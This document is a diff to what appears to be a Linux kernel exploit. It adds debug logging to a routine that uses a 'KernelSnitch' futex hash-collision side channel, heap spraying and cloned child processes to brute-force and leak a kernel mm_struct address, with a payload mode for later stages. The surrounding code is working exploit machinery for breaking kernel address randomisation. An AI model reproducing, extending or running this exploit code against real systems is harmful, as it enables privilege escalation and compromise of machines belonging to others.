@@ -680,8 +680,16 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  pr_info("KernelSnitch setup: cpus=%d mm_per_slab=%zu prep=%zu spray=%zu "
+          "pre=%zu post=%zu\n",
+          cpu_count, mm_objs_per_slab, prepare_ctx.mm_cnt, spray_ctx.mm_cnt,
+          pre_ctx.mm_cnt, post_ctx.mm_cnt);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  pr_info("KernelSnitch parameters: threads=%zu collisions=%zu futexes=%zu "
+          "identity_step=0x%zx\n",
+          ks->thread_cnt, ks->collisions, ks->total_futexes,
+          ks->identity_diff);
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -710,7 +718,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
 
-  if (!kernelsnitch_found_collisions(ks)) {
+  int collisions_found = (int)kernelsnitch_found_collisions(ks);
+  pr_info("KernelSnitch collisions: %s\n",
+          collisions_found ? "found" : "not found");
+  if (!collisions_found) {
     pr_warning("KernelSnitch collision finding failed\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -723,6 +734,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
+  pr_info("KernelSnitch bruteforce: state=%d found=%zu mm_struct=0x%zx\n",
+          ks->state, ks->found, leaked);
   last_mm_struct = leaked;
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
